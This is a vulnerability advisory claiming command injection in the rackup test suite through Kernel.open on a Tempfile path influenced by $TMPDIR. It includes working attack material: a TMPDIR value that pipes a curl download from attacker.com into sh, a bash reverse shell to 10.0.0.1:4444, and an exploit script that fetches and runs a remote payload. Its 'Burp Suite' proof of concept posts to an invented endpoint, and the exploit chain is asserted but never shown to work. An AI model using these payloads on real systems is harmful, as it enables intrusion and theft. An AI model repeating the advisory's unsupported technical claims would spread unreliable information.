## Summary
A **Command Injection vulnerability** exists in the test suite of the [`rack/rackup`](https://github.com/rack/rackup) project (prior to version `1.0.1`). It occurs due to the insecure usage of `Kernel.open()` on a file path derived from an attacker-controlled environment variable (`$TMPDIR`). This flaw enables arbitrary shell command execution during test execution, leading to full **remote code execution (RCE)** in environments where tests are run with developer or CI/CD privileges.

---

### Technical Details

* **Component**: `test/spec_server.rb`
* **Line of Code**: [Line 528](https://github.com/rack/rackup/blob/c6cdd479172f042be405a36709ab27a2dff3a6e1/test/spec_server.rb#L528)
* **Affected Versions**: `< 1.0.1`
* **Vulnerable Function**: `Kernel.open`
* **Trigger Vector**: Malicious `$TMPDIR` environment variable
* **Exploitability**: Local (via environment), remotely feasible via poisoned CI/CD or dependency test run

```ruby
pidfile = Tempfile.new("rackup-pid")
# ...
pid = open(pidfile.path).read.strip  # <- Vulnerable call
```

Ruby's `Kernel.open()` function executes a shell command if the path begins with a `|`. This allows a malicious value in `TMPDIR` to control the path of `Tempfile.new`, leading to shell command injection.

---

## Description of Impact
This vulnerability allows attackers to execute arbitrary shell commands by poisoning the `$TMPDIR` environment variable prior to invoking the test suite or any code path using the vulnerable `Tempfile.new` followed by `Kernel.open`. Since many CI pipelines and developers run test commands with elevated privileges or in trusted environments, exploitation can result in:

* Arbitrary command execution
* Compromised CI/CD pipelines
* Access to secrets, tokens, and environment variables
* Backdoor injection into build artifacts
* Persistent reverse shells

Even though this vulnerability is in a test file, its impact is **critical** in development, testing, or CI/CD environments where untrusted actors (e.g., contributors) may influence the test execution or manipulate environment variables.


## Proof of Concept (Burp Suite)

```http
# Not a direct HTTP attack, but can be modeled as an environmental injection
# Equivalent of Burp-style shell trigger:

POST /test-trigger HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded

TMPDIR=|curl${IFS}http://attacker.com/shell.sh|sh${IFS}&#
```

## Vulnerable Code

**File**: `test/spec_server.rb`
**Line**: 528

```ruby
pidfile = Tempfile.new("rackup-pid")
# ...
pid = open(pidfile.path).read.strip  # Vulnerable to shell execution if path starts with "|"
```
Ruby's `Kernel.open()` is overloaded to support command execution when passed a string prefixed with `|`. Without sanitization or verification of the path, this allows attacker-controlled execution.

## Exploit Steps

1. **Set Malicious TMPDIR**

```bash
export TMPDIR='|curl${IFS}http://attacker.com/shell|sh${IFS}&${IFS}#'
```

2. **Prepare Payload**

```bash
# Attacker side - payload for reverse shell
cat <<EOF > shell.sh
#!/bin/bash
bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
EOF

python3 -m http.server 80
```

3. **Run Vulnerable Test**

```bash
# Developer or CI runs this (simulating test)
bundle exec rake test
```

4. **Receive Reverse Shell**

```bash
nc -nvlp 4444
```

## Full Exploit Script

```ruby
# rackup_exploit.rb
require 'tempfile'

ENV['TMPDIR'] = '|curl${IFS}http://10.0.0.1:8000/payload.sh${IFS}-o${IFS}/tmp/x&&chmod${IFS}+x${IFS}/tmp/x&&/tmp/x${IFS}&${IFS}#'

pidfile = Tempfile.new("rackup-exploit")
puts "[+] Path: #{pidfile.path}"

# Trigger Kernel.open() indirectly
pid = open(pidfile.path).read rescue nil
puts "[!] Payload executed. Check reverse shell."
```

### Detection & Forensics - Environment Inspection
```bash
cat /proc/*/environ | tr '\0' '\n' | grep TMPDIR
```

#### 🧬 YARA Rule

```yara
rule rackup_command_injection {
    strings:
        $a = "|curl"
        $b = "|wget"
        $c = "TMPDIR="
    condition:
        any of ($*) and filesize < 1MB
}
```


### References
* [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
* [RubySec Kernel.open Advisory](https://rubysec.com/advisories/CVE-2021-31799/)
* [Rackup PR #36](https://github.com/rack/rackup/pull/36)



### 👤 Credits
Discovered by [PtR (ptrgits)](https://github.com/ptrgits)

